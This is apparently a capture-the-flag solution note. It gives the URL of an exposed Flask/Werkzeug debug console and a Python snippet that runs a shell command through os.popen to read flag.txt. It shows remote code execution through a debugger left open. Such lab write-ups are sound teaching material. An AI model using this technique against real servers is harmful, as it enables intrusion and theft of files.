### Exploit
1. http://54.180.142.243:5000/console
```python
    import os
    os.popen('cat ./flag.txt').read()
````